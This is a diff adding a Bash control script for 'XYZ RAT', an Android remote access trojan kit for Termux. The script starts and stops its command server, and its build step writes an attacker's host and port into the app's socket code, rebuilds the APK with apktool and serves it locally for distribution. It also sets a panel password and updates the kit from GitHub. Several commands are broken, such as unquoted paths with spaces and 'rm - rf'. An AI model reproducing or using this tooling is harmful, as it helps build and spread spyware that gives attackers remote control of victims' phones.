@@ -1,0 +1,161 @@
+#!/bin/bash
+
+#############################################################
+# Colors
+#############################################################
+clear='\033[0m'
+IRed='\033[0;91m'         # Red
+IGreen='\033[0;92m'       # Green
+IBlue='\033[0;94m'        # Blue
+IPurple='\033[0;95m'      # Purple
+ICyan='\033[0;96m'        # Cyan
+
+
+#############################################################
+# Start
+#############################################################
+if [ "$1" == "start" ]
+then
+	cd $PREFIX/share/XYZ RAT/server
+	pm2 start index.js -s
+	printf "${IGreen}    [✔] 𝙓𝙔𝙕 𝙍𝘼𝙏 𝙎𝙩𝙖𝙧𝙩𝙚𝙙  \n" | pv -qL 30
+
+#############################################################
+# Stop
+#############################################################
+elif [ "$1" == "stop" ]
+then
+	cd $PREFIX/share/XYZ RAT/server
+	pm2 stop index.js -s
+	printf "${IRed}    [✘] 𝙓𝙔𝙕 𝙍𝘼𝙏 𝙎𝙩𝙤𝙥𝙚𝙙\n" | pv -qL 30
+
+
+#############################################################
+# Restart
+#############################################################
+elif [ "$1" == "restart" ] 
+then
+	cd $PREFIX/share/XYZ RAT/server
+	pm2 restart index.js -s
+	printf "${IPurple}    [✔] 𝙓𝙔𝙕 𝙍𝘼𝙏 𝗥𝗲𝘀𝘁𝗮𝗿𝘁𝗲𝗱\n" | pv -qL 30
+
+#############################################################
+# Build
+#############################################################
+elif [ "$1" == "build" ]
+then
+	smaliFile="smali/com/etechd/xyzrat/IOSocket.smali"
+	if [ -d $PREFIX/share/XYZ RAT ]; then
+		appPath="$PREFIX/share/XYZ RAT/server/app/factory/decompiled"
+	fi
+	printf "${ICyan}"
+	read -p "    [✯] 𝗛𝗼𝘀𝘁 ➧ " host
+	read -p "    [✯] 𝗣𝗼𝗿𝘁 ➧ " port
+	sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile
+	apktool b "$appPath" -o $PREFIX/share/XYZ RAT/XYZ RAT.apk > /dev/null 2>&1 
+	printf "${IGreen}    [✔] 𝗔𝗽𝗸 𝗕𝘂𝗶𝗹𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹\n" | pv -qL 30
+	cd $PREFIX/share/XYZ RAT
+	pkill php
+	php -S localhost:8080 > /dev/null 2>&1 &
+	sleep 5
+	termux-open-url http://localhost:8080
+	printf "${IGreen}\n"
+	read -p "              𝙋𝙧𝙚𝙨𝙨 𝙀𝙣𝙩𝙚𝙧 𝙁𝙤𝙧 𝙎𝙩𝙤𝙥 " nothing
+	sleep 2
+	pkill php
+	rm -rf XYZ RAT.apk
+
+
+
+
+#############################################################
+# Bind 
+#############################################################
+
+elif [ "$1" == "bind" ]
+then
+	printf "${ICyan} [★] 𝑨𝒅𝒅𝒆𝒅 𝑺𝒐𝒐𝒏 𝑻𝒉𝒊𝒔 𝑶𝒑𝒕𝒊𝒐𝒏 ${clear}\n" | pv -qL 30
+
+
+#############################################################
+# Clean
+#############################################################
+elif [ "$1" == "clean" ]
+then
+
+	if [ -e $PREFIX/share/XYZ RAT/maindb.json ]
+	then
+		rm - rf $PREFIX/share/XYZ RAT/maindb.json
+	else
+		pm2 restart $PREFIX/share/XYZ RAT/index.js -s
+	fi
+	printf " ${ICyan}   [✔] 𝐂𝐥𝐞𝐚𝐧  𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥 \n" | pv -qL 30
+
+#############################################################
+# Help
+#############################################################
+elif [ "$1" == "-h" ]
+then
+	l="${ICyan}➧${clear}"
+	o="${IGreen}"
+	printf "
+	$l $o xyzrat password\n
+	$l $o xyzrat start\n
+	$l $o xyzrat stop\n
+	$l $o xyzrat restart\n
+	$l $o xyzrat build\n
+	$l $o xyzrat bind (Soon)\n
+	$l $o xyzrat -h (help)\n
+	$l $o xyzrat update\n
+	$l $o xyzrat clean\n" | pv -qL 100
+
+
+
+############################################################
+# Password 
+############################################################
+elif [ "$1" == "password" ]
+then
+	if [ -e $PREFIX/share/XYZ RAT/server/maindb.json ]
+	then
+		printf " ${ICyan}"
+		read -p "   [✯] 𝙉𝙚𝙬 𝙋𝙖𝙨𝙨𝙬𝙤𝙧𝙙 ➧ " pas
+		pass=$(echo -n $pas | md5sum | awk '{print $1}')
+		sed -i "s#\"password\": \"\"#\"password\": \"$pass\"#g" $PREFIX/share/XYZ RAT/server/maindb.json
+		printf " ${IGreen}   [✔] 𝙋𝙖𝙨𝙨𝙬𝙤𝙧𝙙 𝙎𝙖𝙫𝙚𝙙 \n" | pv -qL 30
+	else
+		printf " ${IRed} [-] Error please contact admin for fix it \n" | pv -qL 10
+
+	fi
+
+
+
+###############################################################
+# Update
+###############################################################
+elif [ "$1" == "update" ]
+then
+	cd
+	printf " ${IGreen}   [☢] 𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙓𝙔𝙕 𝙍𝘼𝙏 𝙞𝙨 𝙐𝙥𝙙𝙖𝙩𝙞𝙣𝙜... \n" | pv -qL 30
+	rm -rf $PREFIX/bin/xyzrat
+	rm -rf $PREFIX/share/XYZ RAT
+	rm -rf XYZ-RAT > /dev/null 2>&1 
+	git clone https://github.com/SETU-xyz/XYZ-RAT.git > /dev/null 2>&1
+	cd XYZ-RAT
+	mv XYZ RAT/xyzrat  $PREFIX/bin
+	mv XYZ RAT  $PREFIX/share
+	chmod +x $PREFIX/bin/xyzrat
+	rm -rf $HOME/XYZ-RAT
+	cd $PREFIX/share/XYZ RAT/server
+	npm install pm2 -g
+	npm install 
+	printf " ${IGreen}   [✔] 𝙓𝙔𝙕 𝙍𝘼𝙏 𝙐𝙥𝙙𝙖𝙩𝙚𝙙 𝙎𝙞𝙘𝙚𝙨𝙨𝙛𝙪𝙡 \n" | pv -qL 30
+	
+
+###############################################################
+# Else Part 
+###############################################################
+else
+	printf "${IRed}    [-] 𝙀𝙧𝙧𝙤𝙧 𝙏𝙧𝙮 𝙖𝙜𝙖𝙞𝙣 𝙬𝙞𝙩𝙝 -𝙝\n" | pv -qL 30
+fi
+
